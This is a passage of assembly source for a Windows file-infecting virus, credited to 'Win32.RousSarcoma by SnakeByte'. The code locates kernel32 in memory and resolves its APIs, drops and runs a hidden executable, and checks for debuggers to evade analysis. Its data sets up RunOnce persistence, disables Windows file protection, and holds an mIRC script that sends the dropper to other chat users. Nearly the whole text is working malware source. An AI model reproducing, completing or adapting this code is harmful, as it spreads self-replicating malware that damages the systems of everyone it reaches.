                           ; Check MZ and PE - Signs
CheckPESign:
 cmp dword ptr [edi], 'FP' ; greater or equal to "PF"
 jae NoPESign

 cmp dword ptr [edi], 'DP' ; lower or equal to "PD"
 jbe NoPESign
 
 clc                       ; all left is "PE"
 ret
 
NoPESign:
 stc
 ret

CheckMZSign:

 cmp word ptr [esi], '[M'
 jae NoPESign

 cmp word ptr [esi], 'YM'
 jbe NoPESign

 clc
 ret
ret

; ***************************************************************************
; ----------------[ This is the host for the EXE-Virus Part ]----------------
; ***************************************************************************

FirstGenHost:
 push 0h                   ; stop this !
 call ExitProcess
 jmp FirstGenHost





;
; \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
; ////////////////////////////////////////////////////////////////////////////\
; ###########################################################################/\
; ------------------[ This is the second part of the Virus ]-----------------/\
; ###########################################################################/\
; ////////////////////////////////////////////////////////////////////////////\
; \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
; 

SecondPart:
                          ; Here do we drop the entire file from the
                          ; infected goat and execute it

; ***************************************************************************
; -------------------------[ Search for Kernel ]-----------------------------
; ***************************************************************************


 call Delta

Delta:
 pop ebp
 sub ebp, offset Delta

 mov esi, [esp]            ; get Create Process API
 xor si, si

 call GetKernel            ; Search for kernel
 jnc GetApis               ; If we got it we carry on..
 jmp ExecuteHost

; ***************************************************************************
; --------------------[ Search-Kernel Procedure ]----------------------------
; ***************************************************************************

GetKernel:
 mov byte ptr [ebp+K32Trys], 5h

GK1:
 cmp byte ptr [ebp+K32Trys], 00h
 jz NoKernel               ; did we pass the limit ?

 call CheckMZSign          ; Check for exe-stub
 jnc CheckPE

GK2:
 sub esi, 10000h           ; search next page
 dec byte ptr [ebp+K32Trys]
 jmp GK1                   ; test again

CheckPE:                   ; test for PE-Header
 mov edi, [esi+3Ch]
 add edi, esi
 call CheckPESign

 jnc CheckDLL              ; check dll-sign
 jmp GK2

CheckDLL:
 add edi, 16h
 mov bx, word ptr [edi]    ; get characteristics
 and bx, 0F000h            ; to check for dll flag
 cmp bx, 02000h
 jne GK2
 
KernelFound:               ; We got it !
 sub edi, 16h              ; edi = PE-Header
 xchg eax, edi             ; eax = PE offset
 xchg ebx, esi             ; ebx = MZ offset
 clc                       ; clear carriage flag
 ret

NoKernel:
 stc                       ; set carriage flag if we did not found it
 ret

 K32Trys      db 5h        ; search range

; ***************************************************************************
; ---------------------------[ Search for API's ]----------------------------
; ***************************************************************************

 
                           ; we search for LoadLibaryA and GetProcAddress
                           ; in the kernel to get the other API's

 LL  db 'LoadLibraryA', 0h
 GPA db 'GetProcAddress', 0h 

GetApis:                   ; offset of Kernel32.dll PE-headers in eax

 mov [ebp+KernelAddy], eax ; save
 mov [ebp+MZAddy], ebx

 lea edx, [ebp+LL]         ; Point to LoadLibaryA - API
 mov ecx, 0Ch              ; size of name
 call SearchAPI1           ; search it
 mov [ebp+XLoadLibraryA], eax
                           ; save offset

 xchg eax, ecx             ; if we did not get it, we can't go on
 jecxz ExecuteHost
   
 lea edx, [ebp+GPA]        ; Name of GetProcAddress - API
 mov ecx, 0Eh              ; size
 call SearchAPI1
 mov [ebp+XGetProcAddress], eax

 xchg eax, ecx             ; check if we got it
 jecxz ExecuteHost


GetAPI2:                   ; locate all other apis now
 lea eax, [ebp+KERNEL32]
 push eax
 call dword ptr [ebp+XLoadLibraryA]
 mov [ebp+K32Handle], eax
 test eax, eax
 jz ExecuteHost

 lea esi, [ebp+Kernel32Names2]
 lea edi, [ebp+YCreateFileA]
 mov ebx, [ebp+K32Handle]
 push NumberOf2Kernel32APIS
 pop ecx
 call GetAPI3
 jmp DropIT                ; let's do something serious ;)


; ***************************************************************************
; --------[ Search the kernel export table for the 2 main API's ]------------
; ***************************************************************************


SearchAPI1:
 and word ptr [ebp+counter], 0h
 
 mov eax, [ebp+KernelAddy] ; get PE-Header offset

 mov esi, [eax+78h]        ; get Export Table Address
 add esi, [ebp+MZAddy]
 add esi, 1Ch
 
 lodsd                     ; get address table
 add eax, [ebp+MZAddy]
 mov dword ptr [ebp+ATableVA], eax

 lodsd                     ; get pointer table
 add eax, [ebp+MZAddy]
 mov dword ptr [ebp+NTableVA], eax
 
 lodsd                     ; Ordinal Table
 add eax, [ebp+MZAddy]
 mov dword ptr [ebp+OTableVA], eax

 mov esi, [ebp+NTableVA]   ; get Name Pointer Table

SearchNextApi1:
 push esi
 lodsd
 add eax, [ebp+MZAddy]

 mov esi, eax
 mov edi, edx
 push ecx

 cld
 rep cmpsb                 ; check for api name
 pop ecx
 jz FoundApi1

 pop esi                   ; get next API-Name
 add esi, 4h
 inc word ptr [ebp+counter] 
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1           ; if we checked more than 2000 API's we stop
 jmp SearchNextApi1        ; check next
 
FoundApi1:
 pop esi
 movzx eax, word ptr [ebp+counter]
 shl eax, 1h               ; get right entry

 add eax, dword ptr [ebp+OTableVA]
 xor esi, esi              ; clear esi --> eax
 xchg eax, esi
 lodsw
 shl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
 mov esi, eax              ; get RVA
 lodsd                     ; eax = Adress RVA
 add eax, [ebp+MZAddy]

 ret                       ; API offset in eax
 
NotFoundApi1:
 xor eax, eax              ; we failed :(
 ret

; ***************************************************************************
; ----------------------[ Let's drop the virus to a file ]-------------------
; ***************************************************************************
DropIT:
 
 push 0
 push 080h                 ; normal
 push 1                    ; new file
 push 0
 push 0
 push 40000000h            ; write access
 lea eax, [ebp+HiddenFile]
 push eax
 call dword ptr [ebp+YCreateFileA]
 
 xchg eax, ebx             ; Handle in ebx

 mov esi, ebp
 add esi, ImageBase + Gap1 ; uninitialised data once again ;)

 push 0                    ; overlapped
 lea ecx, [ebp+Write]      ; written bytes
 push ecx
 push VirusSize            ; Lenght
 push esi                  ; Start of Data
 push ebx                  ; File Handle
 Call dword ptr [ebp+YWriteFile]

 push ebx
 call dword ptr [ebp+YCloseHandle]


 xor eax, eax              ; let's execute the virus
 lea esi, [ebp+ProcessInformation] 
 push esi
 lea esi, [ebp+StartupInfo]
 push esi
 push eax                  ; lpCurrentDirectory
 push eax                  ; lpEnvironment  
 push eax                  ; Create_New_Process_Group & Normal_Priority_Class
 push eax                  ; bInheritHandles
 push eax                  ; lpThreadAttributes
 push eax                  ; lpProcessAttributes
 lea esi, [ebp+HiddenFile] 
 push esi                  ; filename with commandline
 push eax                  ; command line
 call dword ptr [XCreateProcessA]

; ***************************************************************************
; -----------------------[ open original program ]---------------------------
; ***************************************************************************

ExecuteHost:

 mov eax,12345678h         ; get back to old Imagebase+EIP
 org $-4
 retEIP dd 0h

 add eax,12345678h
 org $-4
 retBas dd 0h

 jmp eax

 OldEIP  dd 0h
 OldBase dd 0h

 NewEIP  dd 0h

 
; ***************************************************************************
; --------------[ use GetProcAddress to retrieve API's ]---------------------
; ***************************************************************************
                           ; this procedure is used in both parts of the virus !
                           ; esi point to the names
                           ; edi to the place where we save the offsets
                           ; ebx contains module handle
                           ; ecx got the number of api's
GetAPI3:
 push ecx                  ; save number

 push esi                  ; push Api-name 
 push ebx                  ; push Module-Handle
                           ; call GetProcAddress
 cmp ebp, 'VA-A'           ; if we are in the exe-part, we can call
 je API3b                  ; the api directly

 pushad                    ; check for int 1h tracing
 push eax                  ; int 1h tracing destroys the stack, so we will see
 pop eax                   ; if it is destroyed
 sub esp, 4d
 pop ecx
 cmp eax, ecx
 jne EndApi3
 popad

API3a:                     ; otherwise we need the one found in the kernel 
 call dword ptr [ebp+XGetProcAddress]
 jmp API3c

API3b:
 call GetProcAddress

API3c:
 stosd                     ; save offset

 pushad
 cmp eax, 0                ; Lets do a check for Softice Breakpoints
 je NoSICheck
 cmp byte ptr [eax], 0CCh  ; check for the breakpoint
 je EndApi3                ; due to the pushad, we will ret somewhere strange ;)
NoSICheck:
 popad

 pop ecx
 dec ecx
 jz EndApi3

 push ecx                  ; point to next name

SearchZero:
 cmp byte ptr [esi], 0h
 je GotZero
 inc esi
 jmp SearchZero
 
GotZero:
 inc esi
 pop ecx
 jmp GetAPI3               ; get next api

 EndApi3: 
 ret 


; ###########################################################################
; ----------------------[ Third Part - The Data ]----------------------------
; ###########################################################################

; ***************************************************************************
; ---------------------[ Data of the second part ]---------------------------
; ***************************************************************************

NumberOf2Kernel32APIS equ 4

Kernel32Names2:
 db 'CreateFileA', 0
 db 'CloseHandle', 0
 db 'WriteFile',0
 db 'CreateProcessA',0

HiddenFile db 'C:\RousSarc.EXE',0 ; Rous Sarkoma is a well known Retro Virus
KERNEL32   db 'kernel32.dll',0    ; kernel32.dll .. :)

; ***************************************************************************
; ---------------------------[ Some Data ]-----------------------------------
; ***************************************************************************
VirusEnd:

 K32Handle dd (?)          ; Hier speichern wir das Handle der Kernel32.dll 

 XLoadLibraryA    dd (?)   ; Hier die Offsets der ersten beiden API's
 XGetProcAddress  dd (?)

                           ; API's we need for the second part
 YCreateFileA          dd (?)
 YCloseHandle          dd (?)
 YWriteFile            dd (?)
 YCreateProcessA       dd (?)

 StartofVirusinFile dd 0h
 Write              dd 0h

                           ; Daten für die Kernel-Suche
 KernelAddy   dd (?)       ; PE-Header
 MZAddy       dd (?)       ; MZ-Header
 counter  dw (?)           ; Wie viele Namen haben wir getestet

 ATableVA dd (?)           ; Address Table VA
 NTableVA dd (?)           ; Name Pointer Table VA
 OTableVA dd (?)           ; Name Pointer Table VA

; ***************************************************************************
; --------------------[ Initialized First Part Data ]------------------------
; ***************************************************************************

.DATA
 CopyRight    db 'Win32.RousSarcoma by SnakeByte',0

 _2kProt db 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',0
 _2kProtValue db 'SfcDisable',0
 RunOnceName  db '\RousSarc.EXE',0
 RunOnceKey   db 'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',0

 filemask   db '*.EXE', 0  ; get exe-files

 ; Data for mIRC Worming
 MIRCscript db '[script]',13d,10d
            db 'n0=on 1:join:#: { if ( $nick == $me ) halt', 13d,10d
            db 'n1=     else .timer 1 30 .dcc send $nick C:\RousSarc.EXE }', 13d,10d
            db 'n2=on *:filesent:*.*: { if ( $nick != $me ) .dcc send $nick C:\RousSarc.EXE }', 13d,10d
 EndScript:
 mircINI    db 'mirc.ini',0
 MIRCrfiles db 'rfiles',0        ;what to patch
 MOffset    db 'n2',0
 MIRCprot   db 'RousSarc.ini',0

                           ; Names of the API's we need
Kernel32Names:
 NumberOfKernel32APIS equ 21d

 db 'FindFirstFileA', 0
 db 'FindNextFileA', 0
 db 'FindClose', 0
 db 'CreateFileA', 0
 db 'CloseHandle', 0
 db 'CreateFileMappingA', 0
 db 'MapViewOfFile', 0
 db 'UnmapViewOfFile', 0
 db 'GetCommandLineA',0
 db 'ReadFile',0
 db 'CreateProcessA',0
 db 'GetSystemDirectoryA',0
 db 'CopyFileA',0
 db 'GetCurrentProcessId',0
 db 'RegisterServiceProcess',0
 db 'GetCurrentDirectoryA',0
 db 'SetCurrentDirectoryA',0
 db 'GetWindowsDirectoryA',0
 db 'GetFullPathNameA',0
 db 'WritePrivateProfileStringA',0
 db 'WriteFile',0

 advname db 'advapi32',0

AdvapiNames:
 NumberOfAdvapiAPIS equ 6

 db 'RegOpenKeyExA',0
 db 'RegQueryValueExA',0
 db 'RegCloseKey',0
 db 'RegSetValueExA',0
 db 'RegCreateKeyExA',0
 db 'RegEnumKeyA',0

StartupInfo:
 db     64d
 db     63d dup (0)

ProcessInformation:
 hProcess        dd 0h
 hThread         dd 0h 
 dwProcessId     dd 0h
 dwThreadId      dd 0h

; ***************************************************************************
; -------------------[ Uninitialized First Part Data ]-----------------------
; ***************************************************************************
.DATA?
                           ; API's we need for first Part
 XFindFirstFileA              dd ?
 XFindNextFileA               dd ?
 XFindClose                   dd ?
 XCreateFileA                 dd ?
 XCloseHandle                 dd ?
 XCreateFileMappingA          dd ?
 XMapViewOfFile               dd ?
 XUnmapViewOfFile             dd ?
 XGetCommandLineA             dd ?
 XReadFile                    dd ?
 XCreateProcessA              dd ?
 XGetSystemDirectoryA         dd ?
 XCopyFileA                   dd ?
 XGetCurrentProcessId         dd ?
 XRegisterServiceProcess      dd ?
 XGetCurrentDirectoryA        dd ?
 XSetCurrentDirectoryA        dd ?
 XGetWindowsDirectoryA        dd ?
 XGetFullPathNameA            dd ?
 XWritePrivateProfileStringA  dd ?
 XWriteFile                   dd ?

                           ; API's we need to edit the Registry
 XRegOpenKeyExA        dd ?
 XRegQueryValueExA     dd ?
 XRegCloseKey          dd ?
 XRegSetValueExA       dd ?
 XRegCreateKeyExA      dd ?
 XRegEnumKeyA          dd ?

 ADVHandle dd ?            ; Handle of ADVAPI32.dll
 
 NewSize   dd ?            ; New Filesize
 CmdLine   dd ?            ; Commandline
 
                           ; Struktur for FindFirstFile / Next
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME                ENDS

                           ; data for FindFirstFile / Next API
 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 FileHandle              dd       ?         ; Filehandle
 MapHandle               dd       ?         ; Handle of the Map
 MapAddress              dd       ?         ; Offset of the  Map
 Handle                  dd       ?

 Dispostiton dd ?         ; dispostition when creating a reg key
 RegHandle   dd ?         ; handle of an opened registry key
 RegData1    dd ?         ; Bytes read


 InfCounter db ?          ; Counter
 FindHandle dd ?          ; Handle for FindFirstFile API
 FileBuffer db VirusSize dup (?)
                          ; We temporarily save the name of a possible AV
                          ; to check if it is one
 NameBuffer  db 255d dup (?)
 CurrentPath db 255d dup (?)


; ***************************************************************************
; ------------------------[ That's all, go home ]----------------------------
; ***************************************************************************
end Virus
